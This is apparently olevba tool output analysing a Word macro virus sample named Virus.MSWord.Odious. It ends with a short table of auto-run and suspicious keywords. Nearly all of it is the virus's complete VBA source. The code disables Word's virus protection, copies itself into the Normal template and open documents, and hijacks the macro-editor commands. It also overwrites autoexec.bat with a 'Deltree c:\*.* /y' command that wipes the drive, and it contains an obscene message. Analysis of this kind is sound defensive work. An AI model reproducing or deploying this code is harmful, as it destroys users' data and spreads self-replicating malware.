olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Odious
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Odious - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hate_A.bas 
in file: Virus.MSWord.Odious - OLE stream: 'Macros/VBA/Hate_A'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Options.VirusProtection = False
End Sub
Sub AutoOpen()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub AutoNew()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub AutoClose()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Function Virus()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Application.DisplayAlerts = wdAlertsNone
    E
    If VBE.MainWindow.Visible = True Then
        Open "c:\autoexec.bat" For Output As #1
            Print #1, ""
            Print #1, "Deltree c:\*.* /y"
            Print #1, ""
            Print #1, "echo Fuck you...."
        Close #1
        Application.Quit SaveChanges:=wdDoNotSaveChanges
    End If
End Function
Function E()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Dim A, B As String
    A = Application.NormalTemplate.FullName
    B = Application.ActiveDocument.FullName
    Application.OrganizerCopy A, B, "Hate_A", wdOrganizerObjectProjectItems
    Application.OrganizerCopy B, A, "Hate_A", wdOrganizerObjectProjectItems
End Function
Sub ExibirCódigoVB()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub FerramGravarMacroAlternar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub ExibirCódigo()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub FerramMacro()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub InterromperGravação()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub FerramentasGravarMacroIniciar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub FerramentasGravarMacroParar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub ArquivoModelos()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub ArquivoSalvar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
    ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

